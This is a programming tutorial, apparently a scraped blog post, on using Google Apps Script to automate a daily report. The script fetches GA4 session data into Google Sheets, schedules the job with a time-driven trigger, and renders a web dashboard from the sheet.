lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2ODkiIGhlaWdodD0iMzQzIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }1. **File:** You can add multiple `.gs` files to store different object codes for better organization. All files will run under the same Namespace and lifecycle, so be careful with object names and variable names, as duplicates may overwrite each other. In addition to `.gs` script files, you can also add `.html` HTML Template files for rendering Web UI. (More on this later) 2. **Library:** You can use libraries written by others (a.k.a. Lib) by importing them through their Script ID. Of course, you can also deploy your own scripts as libraries for others to use. Additionally, there are some tools packaged by experts that can be used, but the downside is that you can only search for Script IDs through Google, as there is no official database list for querying. e.g. HTML Parser Tool Cheer.io Script ID: `1ReeQ6WO8kKNxoaA_O0XEQ589cIrRvEBA9qcWpNqdOP17i47u6N9M5Xh0` 3. **Services:** The SDKs for Google services that are not included by default can be added here for use. e.g. Google Analytics Data 4. **Undo, Next Action**5. **Save** or Control + s6. **Run** or Control + r If an error occurs, it will directly prompt in the Console and terminate the script. 7. **Debugging** Execution will pause at the Break point (10) and open the Debug View on the right side; you can press continue to execute. If an error occurs, it will pause and open the Debug View on the right side. 8. **Debugging, Target Method (Function Name)** You can only select methods owned by the currently selected file. 9. **View Execution Logs in the Editor**&gt; _Another point to note is formatting; in some browsers, pressing \"Control + [\" for indentation may trigger a return to the previous page, so be cautious!_[**Google Apps Script GitHub Assistant Chrome Extension Version Control Plugin**](https://chromewebstore.google.com/detail/lfjcgcmkmjjlieihflfhjopckgpelofo){:target=\"_blank\"}- It is recommended to install this Extension to connect Google Apps Script with git, enabling version control functionality to prevent accidental changes.![](/assets/f6713ba3fee3/1*NIFgOdZ2EIv-FCfYOxCmsA.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDIxIiBoZWlnaHQ9IjE5OSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==\" }![](/assets/f6713ba3fee3/1*JQyQCdn-FAtItaJ2qrLnng.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNTkiIGhlaWdodD0iMjM1Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![](/assets/f6713ba3fee3/1*TqsqHeccSt8-qN4Tav0kwg.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NTQiIGhlaWdodD0iNjQxIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }- If you encounter Push/Pull Errors or if it does not respond when clicked, please follow the steps above: \"Options\" -&gt; Connect to Github or re-verify Google authorization.**Logger Message**You can use the following Script in conjunction with Debug to print Debug Logs in the Console below.```javascriptLogger.log(\"Hi\")Execution Logs, Error InformationLogs or errors during execution in the editor will be displayed directly. If you want to check execution logs or errors that occurred during automatic execution, you can view them in the “Execution Items” tab.Automatic TriggersIn the “Trigger Conditions” tab, you can set how the methods in the script should be automatically triggered. The automatic trigger conditions you can set include: When Google Sheet: Opens, Edits, Content Changes, Submits Form Scheduled triggers: Execute once every X minutes, X hours, X days, X weeks, X months Specific date triggers: Execute at YYYY-MM-DD HH:MM When Calendar: UpdatesError notification settings allow you to configure how you will be notified when the script encounters an error.Grant Execution Permissions The first time you execute/deploy or add imported services and resources, you need to re-run the identity authorization. After authorization, all subsequent executions will use the identity you authorized, so ensure that the account you authorize (usually the current one) has access to the resource or service. (e.g. you need to have access to that Google Sheet).After the account selection pop-up appears, choose the account to authorize execution (usually the current Google Apps Script account):If you see “Google hasn’t verified this app,” it is because the app we are developing is for personal use and does not need to go through Google verification.Simply click “Advanced” -&gt; “Go to XXX (unsafe)” -&gt; “Allow”:Once authorization is complete, you can successfully execute the script. If there are no changes to the resources, you do not need to re-authorize.2. Obtain/Create the Corresponding Date SheetAfter understanding the basic knowledge, we can write the program for the first function.We create the following multiple files to conveniently store different objects.DailyReportStyle.gs Field Style Object:class HeaderStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#e3284b\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class ContentStyle { constructor() { this.color = \"#000000\"; this.backgroundColor = \"#ffffff\"; this.bold = false; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}class HeaderDateStyle { constructor() { this.color = \"#ffffff\"; this.backgroundColor = \"#001a40\"; this.bold = true; this.size = 12; this.horizontalAlignment = \"center\"; this.verticalAlignment = \"middle\"; }}DailyReportField.gs Field Data Object:class DailyReportField { constructor(name, headerStyle, contentStyle, format = null, value = null) { this.name = name; this.headerStyle = headerStyle; this.contentStyle = contentStyle; this.format = format; this.value = value; }}DailyReport.gs Main Report Logic:class DailyReport { constructor(sheetID, date) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; this.sheetFields = [ new DailyReportField(\"Date\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"Week\", new HeaderDateStyle(), new HeaderDateStyle()), new DailyReportField(\"Daily Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC Traffic) + 5(Mobile Traffic) new DailyReportField(\"PC Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"Mobile Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\"), new DailyReportField(\"Registration Count\", new HeaderStyle(), new ContentStyle(), \"#,##0\") ] // Explanation of the daily traffic formula: // 1. The COLUMN() function returns the column number of the current cell. // 2. ADDRESS(1, COLUMN(), 4) generates an absolute reference address using the given row number (the result of `COLUMN()`) and a fixed column number (1). The third parameter 4 indicates a relative address without any dollar signs ($). For example, if you use this function in any cell of the third column, it will return \"C1\". // 3. SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") removes the number 1 from the address generated by the ADDRESS function, leaving only the letter of the column, e.g., \"C\". // 4. INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 4) here &amp; 4 should actually be &amp;4. The result of `SUBSTITUTE` will concatenate with the number 4, forming a string like \"C4\", and then the INDIRECT function will convert this string into the corresponding cell reference. So, if you use this formula in any cell of column C, it will reference C4. // 5. Similarly, `INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN(), 4), \"1\", \"\") &amp; 5)` will reference the cell in the fifth row of the same column. For example, if you use this formula in any cell of column C, it will reference C5. // 6. Finally, the values of the two INDIRECT function-referenced cells are added together. } execute() { const sheet = this.getSheet(); } // Get the target Sheet for the given date getSheet() { // Distinguish Sheets by month, find the Sheet for the current month var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // If not, create a new monthly Sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // Monthly Sheet naming convention getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // Create a new monthly Sheet makeMonthSheet() { // Add the current month's Sheet and move it to the first position var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // Add the first column, set the column name, Pinned, width 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // Fill in the column names for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // Set row height thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // Set Pinned for the first two rows (Date, Week) thisMonthSheet.setFrozenRows(2); // Add a total column thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // Add a column at the last column const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // Fill in the total column for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // Date... this.setContent(range, \"Total\", style); } else if (summaryRowIndex == 2) { // Week...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"Total\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); // 1. The IFERROR(value, [value_if_error]) function is used to determine if there is an error in the formula and returns a specified value if there is an error. It takes two parameters: `value` is the expression or function to be calculated, and `value_if_error` is the value returned when value encounters an error. In this context, if there is an error in the calculation of the SUM function, it returns 0. // 2. The SUM(range) function is used to calculate the total of all numbers in the range. // 3. The INDIRECT(ref_text, [is_A1_notation]) function converts a text string into a cell reference. Here, the INDIRECT function is used to dynamically generate the required reference range. // 4. The SUBSTITUTE(text, old_text, new_text, [instance_num]) function replaces specified text in a text string. Here, SUBSTITUTE is used to replace \"1\" in the address returned by the ADDRESS function with something else. // 5. The ADDRESS(row, column, [abs_num], [a1], [sheet]) function returns the corresponding cell address based on the given row and column numbers. Here, ADDRESS(1, 1, 4) generates the cell address for the first row and first column, but since abs_num is 4, the address does not include the sheet name and fixed symbol $. Similarly, `ADDRESS(1, COLUMN() - 1, 4)` generates the cell address from the first row to the previous column of the current column. // 6. The COLUMN() function returns the column number of the current cell. // 7. summaryRowIndex = the current row } } return thisMonthSheet; } setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}Main.gs as the main program entry:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\"// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute();}After completing, we return to Main.gs, select “debug,” and press debug to check if the execution result is correct and if there are any errors.If executed correctly, the report will show the current new month with the default fields and total column. If it already exists, there will be no response.3. Connect to Google Analytics to Retrieve DataFirst, you need to add the “AnalyticsData” service:Use the GA4 Debug Tool to construct query conditions: https://ga-dev-tools.google/ga4/query-explorer/ You can build it while comparing with the filtering conditions in the GA 4 backend. This article uses querying the number of Sessions as an example, distinguishing device Grouping.After logging in and authorizing, select the target resource:Note the number displayed under the property, which is your GA Property ID for querying.Set the query parameters and Filter conditions:```markdownPress \"Make Request\" to obtain the Response result:![](/assets/f6713ba3fee3/1*UArMZH6b0LPKj8_HTFrX9g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4NDciIGhlaWdodD0iODg5Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }You can synchronously compare the data from the GA 4 backend under the same conditions to see if they match. If there is a significant discrepancy, it may be due to a missing filter condition, so please check again.#### NoteHere’s a small pitfall discovered by a marketing colleague: some data in GA may have a delay issue, meaning that the numbers you check today might differ from those checked yesterday (for example, the bounce rate). Therefore, it’s best to backtrack the data a few days to ensure that the final numbers are accurate.&gt; _Once the GA Debug Tool shows no issues, we can convert it to Google Apps Script._Add a new `GAData.gs` file:```javascript// Remember to add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// GA Debug Tool: https://ga-dev-tools.web.app/ga4/query-explorer/class GAData { constructor(date) { this.date = date; const traffic = this.fetchGADailyUsage(); this.pc_traffic = traffic[\"desktop\"]; this.mobile_traffic = traffic[\"mobile\"]; } fetchGADailyUsage() { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"deviceCategory\"; const metric = AnalyticsData.newMetric(); metric.name = \"sessions\"; const dateRange = AnalyticsData.newDateRange(); // Default query for data within the given date range e.g. 2024-01-01 ~ 2024-01-01 dateRange.startDate = this.getDateString(); dateRange.endDate = this.getDateString(); // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // const filter = AnalyticsData.newFilter(); // filter.fieldName = \"landingPagePlusQueryString\"; // const stringFilter = AnalyticsData.newStringFilter() // stringFilter.value = \"/life|/article|/chat|/house|/event/230502|/event/230310\"; // stringFilter.matchType = \"PARTIAL_REGEXP\"; // filter.stringFilter = stringFilter; // filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; // Filter Example: // const filterExpression = AnalyticsData.newFilterExpression(); // filterExpression.expression = filterExpression; // request.dimensionFilter = filterExpression; // or Not // const notFilterExpression = AnalyticsData.newFilterExpression(); // notFilterExpression.notExpression = filterExpression; // request.dimensionFilter = notFilterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + gaPropertyId).rows; // No data if (report == undefined) { return {\"desktop\": 0, \"mobile\": 0}; } // [{metricValues=[{value=4517}], dimensionValues=[{value=mobile}]}, {metricValues=[{value=3189}], dimensionValues=[{value=desktop}]}, {metricValues=[{value=63}], dimensionValues=[{value=tablet}]}] var result = {}; report.forEach(function(element) { result[element.dimensionValues[0].value] = element.metricValues[0].value; }); return result; } getDateString() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM-dd\"); }}Add test content to Main.gs:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { var report = new DailyReport(targetGoogleSheetID, new Date()); report.execute(); // var gaData = new GAData(new Date()); Logger.log(gaData);}Press run or debug to obtain the program’s fetching results:OK! The comparison matches.When this step is completed, the directory file structure is as shown in the image above.4. Fill in DataAfter creating the Sheet and checking the data, the next step is to fill in the data into the columns.Adjust DailyReport.gs to add columns by date and the logic for filling in data:class DailyReport { constructor(sheetID, date, gaData, inHouseReportData) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.date = date; const dateString = Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\"); const weekString = [\"Sunday\", \"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\"][date.getDay()]; // Get the day of the week, Sunday is 0, Monday is 1, and so on. this.sheetFields = [ new DailyReportField(\"Date\", new HeaderDateStyle(), new HeaderDateStyle(), null, dateString), new DailyReportField(\"Day\", new HeaderDateStyle(), new HeaderDateStyle(), null, weekString), new DailyReportField(\"Daily Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", '=INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;4)+INDIRECT(SUBSTITUTE(ADDRESS(1,COLUMN(),4),\"1\",\"\")&amp;5)'), // =4(PC Traffic) + 5(Mobile Traffic) new DailyReportField(\"PC Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.pc_traffic), new DailyReportField(\"Mobile Traffic\", new HeaderStyle(), new ContentStyle(), \"#,##0\", gaData.mobile_traffic), new DailyReportField(\"Registration Count\", new HeaderStyle(), new ContentStyle(), \"#,##0\", inHouseReportData.registers) ] } execute() { const sheet = this.getSheet(); const dateColumnIndex = this.makeOrGetDateColumn(sheet); // Get the existing update or create a new column // Fill in the column content for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const rowIndex = parseInt(currentRow) + 1; if (rowIndex != null) { const range = sheet.getRange(rowIndex, dateColumnIndex); const text = sheetField.value; const style = sheetField.contentStyle; this.setContent(range, text, style); this.setFormat(range, sheetField.format); } } } // Get the target Sheet for the given date getSheet() { // Distinguish Sheets by month, find the current month's Sheet var thisMonthSheet = this.separateSheet.getSheetByName(this.getSheetName()); if (thisMonthSheet == null) { // If not, create a new monthly Sheet thisMonthSheet = this.makeMonthSheet(); } return thisMonthSheet; } // Naming the monthly Sheet getSheetName() { return Utilities.formatDate(this.date, \"GMT+8\", \"yyyy-MM\"); } // Create a new monthly Sheet makeMonthSheet() { // Add the current month's Sheet, move it to the first position var thisMonthSheet = this.separateSheet.insertSheet(this.getSheetName(), {index: 0}); thisMonthSheet.activate(); this.separateSheet.moveActiveSheet(1); // Add the first column, column name, set Pinned, width 200 thisMonthSheet.insertColumnsBefore(1, 1); thisMonthSheet.setFrozenColumns(1); thisMonthSheet.setColumnWidths(1, 1, 200); // Fill in the column names for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const text = sheetField.name; const style = sheetField.headerStyle; const range = thisMonthSheet.getRange(parseInt(currentRow) + 1, 1); this.setContent(range, text, style); range.setHorizontalAlignment(\"left\"); } // Set row height thisMonthSheet.setRowHeights(1, Object.keys(this.sheetFields).length, 30); // Set Pinned for the first two rows (Date, Day) thisMonthSheet.setFrozenRows(2); // Add a total column thisMonthSheet.insertColumnsAfter(thisMonthSheet.getLastColumn(), 1); // Add a column at the last column const summaryColumnIndex = thisMonthSheet.getLastColumn() + 1; // Fill in the total column for(const currentRow in this.sheetFields) { const sheetField = this.sheetFields[currentRow]; const summaryRowIndex = parseInt(currentRow) + 1; const range = thisMonthSheet.getRange(summaryRowIndex, summaryColumnIndex); const style = sheetField.contentStyle; if (summaryRowIndex == 1) { // Date... this.setContent(range, \"Total\", style); } else if (summaryRowIndex == 2) { // Day...merge... const mergeRange = thisMonthSheet.getRange(1, summaryColumnIndex, summaryRowIndex, 1); this.setContent(mergeRange, \"Total\", style); mergeRange.merge(); } else { this.setContent(range, '=IFERROR(SUM(INDIRECT(SUBSTITUTE(ADDRESS(1, 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+'):INDIRECT(SUBSTITUTE(ADDRESS(1, COLUMN() - 1, 4), \"1\", \"\") &amp; '+summaryRowIndex+')), 0)', style); } } return thisMonthSheet; } // Create or get the date column // Add a column from the most recent day makeOrGetDateColumn(sheet) { const firstRowColumnsRange = sheet.getRange(1, 1, 1, sheet.getLastColumn()); // Get the first row (date) data range const firstRowColumns = firstRowColumnsRange.getValues()[0]; // Get the values of the data range 0 = first row var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(this.date, \"GMT+8\", \"yyyy/MM/dd\"))); // Find the corresponding date column Index if (columnIndex &lt; 0) { // Not Found, find the position of the previous day var preDate = new Date(this.date); preDate.setDate(preDate.getDate() - 1); while(preDate.getMonth() == this.date.getMonth()) { columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); if (columnIndex &gt;= 0) { break; } preDate.setDate(preDate.getDate() - 1); } if (columnIndex &gt;= 0) { columnIndex += 1; sheet.insertColumnsAfter(columnIndex, 1); // Add a column after the previous day's column columnIndex += 1; } } else { columnIndex += 1; } if (columnIndex &lt; 0) { sheet.insertColumnsAfter(1, 1); // Default, directly add a column after the first column columnIndex = 2; } // Set column width sheet.setColumnWidths(columnIndex , 1, 100); return columnIndex } // Set column Format style setFormat(range, format) { if (format != null) { range.setNumberFormat(format); } } // Fill content into the column setContent(range, text, style) { if (String(text) != \"\") { range.setValue(text); } range.setBackgroundColor(style.backgroundColor); range.setFontColor(style.color); if (style.bold) { range.setFontWeight(\"bold\"); } range.setHorizontalAlignment(style.horizontalAlignment); range.setVerticalAlignment(style.verticalAlignment); range.setFontSize(style.size); range.setBorder(true, true, true, true, true, true, \"black\", SpreadsheetApp.BorderStyle.SOLID); }}Adjust Main.gs to add data connection and assign values during the build phase:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { const date = new Date(); const gaData = new GAData(date); const inHouseReportData = fetchInHouseReportData(date); const report = new DailyReport(targetGoogleSheetID, date, gaData, inHouseReportData); report.execute(); }// Simulated partial data that may be obtained from other platform APIs.function fetchInHouseReportData(date) { // EXAMPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}After completion, we return to Main.gs, select “debug,” and press debug to check if the execution results are correct and if there are any errors.Back to Google Sheet! Success! We have successfully auto-added the data for that date.5. Set Up Scheduling for Daily Automatic ExecutionOnce the script is complete, you just need to set the automatic trigger conditions to run it daily.Adjust Main.gs to add the cronjob() function:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}// In reality, it is usually the case that today's data checks yesterday's data for complete informationfunction cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}// Simulated partial data that may be obtained from other platform APIs.function fetchInHouseReportData(date) { // EXAMPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); // REMEMBER, DUE TO SECURITY REASON, We can't customize user-agent. return {\"registers\": Math.floor(Math.random() * (180 - 30 + 1)) + 30} // MOCK DATA random 30~180}In the editor, switch to the “Triggers” tab and select “Add Trigger” in the bottom right corner: Choose the function you want to execute: the newly added Main.gs function cronjob Choose the deployment to execute: the top (Head, meaning the latest version) Select the event source: time-driven Select the time-based trigger type: daily timer Select the time period: AM 4:00 — AM 5:00 (GMT+08:00)Usually, it will execute right at 4:00 AM. Error notification settings: whether to notify immediately when the script encounters an error or to summarize once daily.Save the settings, and you’re done.You can later check the execution log results in the “Execution Items” tab: Thus, we have completed the automation of querying, adding data, and filling in data for the report RPA function. 🎉🎉🎉Build a Web GUI DashboardNext, there is a secondary requirement: we need to create a simple web display of daily data (similar to a situation room concept) that will be directly shown on a large screen on the team’s back wall.The effect is as shown in the image below:Add Web_DailyReport.gs to write code that reads Google Sheets and converts columns and styles into HTML format for presentation:class WebDailyReport { constructor(sheetID, dayCount) { this.separateSheet = SpreadsheetApp.openById(sheetID); this.dayCount = dayCount; this.sheetRows = [ \"Date\", \"Day\", \"Daily Traffic\", \"PC Traffic\", \"Mobile Traffic\", \"Registration Count\" ]; } allData(startDate) { var sheetRowsIndexs = {}; var count = this.dayCount; var result = []; while (count &gt;= 0) { const preDate = new Date(startDate); preDate.setDate(preDate.getDate() - (this.dayCount - count)); const sheetName = Utilities.formatDate(preDate, \"GMT+8\", \"yyyy-MM\"); const targetSheet = this.separateSheet.getSheetByName(sheetName); if (targetSheet != null) { const firstRowColumnsRange = targetSheet.getRange(1, 1, 1, targetSheet.getLastColumn()); // Get the first row (date) data range const firstRowColumns = firstRowColumnsRange.getValues()[0]; // Get the values of the data range 0 = first row var columnIndex = firstRowColumns.findIndex((date) =&gt; (date instanceof Date &amp;&amp; Utilities.formatDate(date, \"GMT+8\", \"yyyy/MM/dd\") == Utilities.formatDate(preDate, \"GMT+8\", \"yyyy/MM/dd\"))); // Find the corresponding date column Index if (columnIndex &gt;= 0) { columnIndex = parseInt(columnIndex) + 1; if (sheetRowsIndexs[sheetName] == undefined || sheetRowsIndexs[sheetName] == null) { sheetRowsIndexs[sheetName] = this.sheetRows.map((sheetRow) =&gt; this.getFieldRow(targetSheet, sheetRow)); } if (result.length == 0) { // Add the first column const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, 1)) : (null)); result.push(this.makeValues(ranges)); } const ranges = sheetRowsIndexs[sheetName].map((rowIndex) =&gt; (rowIndex != null) ? (targetSheet.getRange(rowIndex, columnIndex)) : (null)); result.push(this.makeValues(ranges)); } } count -= 1; } var transformResult = {}; for (const columnIndex in result) { for (const rowIndex in result[columnIndex]) { if (transformResult[rowIndex] == undefined) { transformResult[rowIndex] = []; }if (columnIndex == 0) { transformResult[rowIndex].unshift(result[columnIndex][rowIndex]);} else { transformResult[rowIndex].splice(1, 0, result[columnIndex][rowIndex]);}}return transformResult;}// Convert field attribute values into display objectsmakeValues(ranges) { const data = ranges.map((range) =&gt; (range != null) ? (range.getDisplayValues()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const backgroundColors = ranges.map((range) =&gt; (range != null) ? (range.getBackgrounds()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const colors = ranges.map((range) =&gt; (range != null) ? (range.getFontColorObjects()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const sizes = ranges.map((range) =&gt; (range != null) ? (range.getFontSizes()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const bolds = ranges.map((range) =&gt; (range != null) ? (range.getFontWeights()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const horizontalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getHorizontalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); const verticalAlignments = ranges.map((range) =&gt; (range != null) ? (range.getVerticalAlignments()) : (null)).map((values) =&gt; (values != null) ? (values[0][0]) : (null)); var result = []; for(const index in data) { const row = data[index]; result.push({ \"value\": row, \"backgroundColor\": backgroundColors[index], \"color\": this.colorStripper(colors[index]?.asRgbColor()?.asHexString()), \"size\": sizes[index], \"bold\": bolds[index], \"horizontalAlignment\": this.alignConventer(horizontalAlignments[index]), \"verticalAlignment\": verticalAlignments[index] }); } return result;}colorStripper(colorString) { if (colorString == undefined || colorString == null) { return null } if (colorString.length == 9) { return \"#\"+colorString.substring(3, 9); } else { return colorString; }}alignConventer(horizontalAlignment) { if (horizontalAlignment == undefined || horizontalAlignment == null) { return null } return horizontalAlignment.replace('general-', '')}getFieldRow(sheet, name) { const firstColumnRowsRange = sheet.getRange(1, 1, sheet.getLastRow(), 1); // Get the data range of the first column const firstColumnRows = firstColumnRowsRange.getValues(); // Get the values of the data range const foundIndex = firstColumnRows.findIndex((firstColumnRow) =&gt; firstColumnRow[0] == name); if (foundIndex &lt; 0) { return null; } else { return foundIndex + 1; }}}Main.gs Add Web Request Handle:const targetGoogleSheetID = \"1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE\";// https://docs.google.com/spreadsheets/d/1-9lZCpsu3E7eDmO-lMkXJXQ6Y6KK4SiyU6uBODcDcFE/edit#gid=275710641const gaPropertyId = \"318495208\";function debug() { cronjob();}function cronjob() { const yesterday = new Date(); yesterday.setDate(yesterday.getDate() - 1); const gaData = new GAData(yesterday); const inHouseReportData = fetchInHouseReportData(yesterday); const report = new DailyReport(targetGoogleSheetID, yesterday, gaData, inHouseReportData); report.execute();}function doGet(e) { return HtmlService.createTemplateFromFile('Web_DailyReport_ Scaffolding').evaluate();}function getDailyReportBody() { const html = HtmlService.createTemplateFromFile('Web_DailyReport_Body').evaluate().getContent(); return html;}// FOR POST// function doPost(e) {// ref: https://developers.google.com/apps-script/guides/web?hl=zh-tw// }// Simulated partial data that may be obtained from other platform APIs.function fetchInHouseReportData(date) { // EXAMPLE REQUEST: // var options = { // 'method' : 'get', // 'headers': { // 'Authorization': 'Bearer XXX' // } // }; // OR // var options = { // 'method' : 'post', // 'headers': { // 'Authorization': 'Bearer XXX' // }, // 'payload' : data // }; // var res = UrlFetchApp.fetch(url, options); // const result = JSON.parse(res.getContentText()); 